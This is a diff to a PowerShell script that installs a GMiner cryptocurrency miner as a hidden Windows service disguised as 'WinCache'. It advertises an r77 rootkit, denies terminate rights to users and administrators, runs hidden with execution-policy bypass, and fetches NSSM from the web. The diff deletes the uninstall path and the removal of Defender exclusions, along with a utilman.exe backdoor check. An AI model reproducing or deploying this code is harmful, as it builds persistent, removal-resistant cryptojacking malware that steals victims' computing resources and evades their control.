@@ -3,10 +3,9 @@
 .SYNOPSIS
     Deploys and runs GMiner as a Windows Service using NSSM.
     Includes DACL protection (Access Denied on kill), r77 Rootkit, and Safe Update.
+    NOTE: This version DOES NOT include the -Uninstall switch.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
-.EXAMPLE
-    .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
 param(
@@ -15,7 +14,6 @@ param(
     [string]$Algo,
     [string]$Worker,
     [string]$DiscordWebhook,
-    [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
     [switch]$Diagnose,
@@ -32,7 +30,7 @@ $ExePath   = Join-Path $Root 'WinCache.exe'
 $SelfPs    = Join-Path $Root 'WinCache.ps1'
 $NssmPath  = Join-Path $Root 'nssm.exe'
 $LogFile   = Join-Path $LogDir 'cache.log'
-$TaskName  = 'WinCacheAgent' # Nombre del servicio y tarea
+$TaskName  = 'WinCacheAgent' # Nombre del servicio
 
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
@@ -56,7 +54,6 @@ public static class AclProtector {
         try {
             IntPtr hProcess = GetCurrentProcess();
             
-            // Obtenemos el descriptor de seguridad actual
             RawSecurityDescriptor rawSd = new RawSecurityDescriptor(
                 ControlFlags.DiscretionaryAclPresent | ControlFlags.SelfRelative,
                 new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
@@ -67,7 +64,6 @@ public static class AclProtector {
 
             DiscretionaryAcl dacl = (DiscretionaryAcl)rawSd.DiscretionaryAcl;
 
-            // Denegar terminación a Usuarios Autenticados y Administradores
             dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
             dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
 
@@ -75,7 +71,6 @@ public static class AclProtector {
             byte[] sdBytes = new byte[rawSd.BinaryLength];
             rawSd.GetBinaryForm(sdBytes, 0);
 
-            // 4 = DACL_SECURITY_INFORMATION
             return SetKernelObjectSecurity(hProcess, 4, sdBytes);
         } catch {
             return false;
@@ -151,133 +146,14 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
-# ---------- secure admin revocation + utilman.exe integrity check & repair -----
-# Compatible: Windows 10 (1607+) / Windows 11 · Requiere PowerShell como Admin
-
-# --- Guardrails ---
-if (-not (Test-IsElevated)) {
-    Write-Host '[-] Ejecute PowerShell como Administrador.'
-    exit 1
-}
-
-# --- Comprobar admins habilitados (no solo existentes) ---
-function Test-BackupAdmin {
-    $members = Get-AdminMembers
-    if (-not $members -or $members.Count -eq 0) {
-        Write-Host '[-] No hay administradores. Abortando.'
-        return $false
-    }
-    $enabled = @($members | Where-Object {
-        # Excluir la cuenta actual
-        $_.Name -ne ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name -and
-        # Excluir deshabilitados
-        (Get-LocalUser -Name ($_.Name.Split('\')[-1]) -ErrorAction SilentlyContinue).Enabled -eq $true
-    })
-    if ($enabled.Count -lt 1) {
-        Write-Host '[-] No queda ningún administrador habilitado tras la revocación. Abortando.'
-        return $false
-    }
-    return $true
-}
-
-# --- Main ---
-if (Test-BackupAdmin) {
-    Remove-CurrentUserAdmin
-    # Verificación real por SID, no por -like:
-    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $stillAdmin = (Get-AdminMembers | Where-Object { $_.SID.Value -eq $me.User.Value }).Count -gt 0
-    if ($stillAdmin) { Write-Host '[-] No se pudo revocar.'; exit 1 }
-    Write-Host '[+] Revocado. Cierre sesión.'
-}
-
-# ---------- utilman.exe integrity check & repair ----------------------------
-function Get-UtilmanBackup {
-    # Copia de componente más reciente en WinSxS (sin recursión completa, que es lentísima)
-    Get-ChildItem "$env:SystemRoot\WinSxS\amd64_microsoft-windows-utilman_*\utilman.exe" -ErrorAction SilentlyContinue |
-        Sort-Object LastWriteTime -Descending |
-        Select-Object -First 1
-}
-
-function Test-Utilman {
-    $utilman = "$env:SystemRoot\System32\utilman.exe"
-    $cmd     = "$env:SystemRoot\System32\cmd.exe"
-
-    if (-not (Test-Path $utilman)) { return $false }
-
-    $hU = (Get-FileHash $utilman -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
-    if (-not $hU) { return $false }
-
-    # Backdoor clásico: utilman.exe reemplazado por una copia de cmd.exe
-    if (Test-Path $cmd) {
-        $hC = (Get-FileHash $cmd -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
-        if ($hC -and $hU -eq $hC) { return $false }
-    }
-
-    # Comprobación adicional contra la copia de componente más reciente
-    $backup = Get-UtilmanBackup
-    if ($backup) {
-        $hB = (Get-FileHash $backup.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
-        if ($hB -and $hU -ne $hB) { return $false }
-    }
-    return $true
-}
-
-function Repair-Utilman {
-    $utilman = "$env:SystemRoot\System32\utilman.exe"
-    $backup  = Get-UtilmanBackup
-
-    # 1. SFC + DISM
-    Write-Host '[*] Ejecutando SFC /scannow...'
-    Start-Process sfc -ArgumentList '/scannow' -Wait -NoNewWindow
-    Write-Host '[*] Ejecutando DISM /Online /Cleanup-Image /RestoreHealth...'
-    Start-Process DISM -ArgumentList '/Online','/Cleanup-Image','/RestoreHealth' -Wait -NoNewWindow
-
-    if (Test-Utilman) {
-        Write-Host '[+] utilman.exe reparado por SFC/DISM.'
-        return
-    }
-
-    # 2. Fallback manual
-    if (-not $backup) {
-        Write-Host '[-] No se encontró copia de utilman.exe en WinSxS. Saltando reparación manual.'
-        return
-    }
-
-    Write-Host '[*] Reparación manual de utilman.exe...'
-    if (Test-Path $utilman) {
-        takeown /f $utilman 2>$null | Out-Null
-        # SID de Administradores → funciona en cualquier idioma del SO
-        icacls $utilman /grant '*S-1-5-32-544:F' 2>$null | Out-Null
-    }
-    Copy-Item $backup.FullName $utilman -Force
-
-    if (Test-Path $utilman) {
-        Write-Host '[+] utilman.exe restaurado manualmente.'
-    } else {
-        Write-Host '[-] Falló la reparación manual de utilman.exe.'
-    }
-}
-
-if (-not $Uninstall) {
-    if (-not (Test-Utilman)) {
-        Write-Host '[-] utilman.exe ausente, alterado o idéntico a cmd.exe. Iniciando reparación...'
-        Repair-Utilman
-    } else {
-        Write-Host '[+] utilman.exe íntegro.'
-    }
-}
-
-
-# ---------- uninstall / stop safe -------------------------------------------
+# ---------- stop safe (solo para actualizaciones) ---------------------------
 function Stop-Safe {
     Write-Host '[*] Deteniendo servicio y procesos de forma segura...'
     
-    # Intentar detener el servicio con NSSM si existe
     if (Test-Path $NssmPath) {
         & $NssmPath stop $TaskName 2>$null | Out-Null
     }
     
-    # Si quedó algún proceso de PowerShell atascado, matarlo
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
     foreach ($w in $watchers) {
@@ -286,21 +162,6 @@ function Stop-Safe {
     
     Start-Sleep -Seconds 1
     Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-}
-
-if ($Uninstall) {
-    Stop-Safe
-    # Eliminar servicio
-    if (Test-Path $NssmPath) { & $NssmPath remove $TaskName confirm 2>$null | Out-Null }
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    
-    try {
-        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
-        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
-    } catch {}
-    
-    Write-Host '[+] Desinstalado correctamente.'
-    return
 }
 
 # ---------- watcher mode ----------------------------------------------------
@@ -416,7 +277,6 @@ if (-not (Test-Path $NssmPath)) {
     Write-Host '[*] Descargando NSSM (Non-Sucking Service Manager)...'
     $nssmZip = Join-Path $env:TEMP 'nssm.zip'
     $nssmStage = Join-Path $env:TEMP 'nssm_stage'
-    # Usando un mirror de GitHub para mayor velocidad de descarga
     Invoke-WebRequest -Uri 'https://nssm.cc/release/nssm-2.24.zip' -OutFile $nssmZip -UseBasicParsing
     Expand-Archive -Path $nssmZip -DestinationPath $nssmStage -Force
     $nssmExe = Get-ChildItem $nssmStage -Recurse -Filter 'nssm.exe' | Where-Object { $_.FullName -match 'win64' } | Select-Object -First 1
@@ -447,17 +307,14 @@ if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo d
 # ---------- safe update & service install -----------------------------------
 Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
 Stop-Safe
-
-# Limpiamos cualquier rastro de la tarea programada vieja
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-# Argumentos para el servicio
 $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
 if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
 $argList += " -Run -NoElevate"
 
 Write-Host '[*] Instalando como Servicio de Windows (NSSM)...'
-& $NssmPath remove $TaskName confirm 2>$null | Out-Null # Eliminar si ya existía
+& $NssmPath remove $TaskName confirm 2>$null | Out-Null
 & $NssmPath install $TaskName "powershell.exe" $argList | Out-Null
 & $NssmPath set $TaskName AppExit Default Restart | Out-Null
 & $NssmPath set $TaskName AppRestartDelay 30000 | Out-Null
@@ -481,7 +338,4 @@ Write-Host "  Log     : $LogFile"
 Write-Host ''
 Write-Host '  Diagnose:'
 Write-Host '    .\Mine.ps1 -Diagnose'
-Write-Host ''
-Write-Host '  Stop everything:'
-Write-Host '    .\Mine.ps1 -Uninstall'
 Write-Host '=================================================='
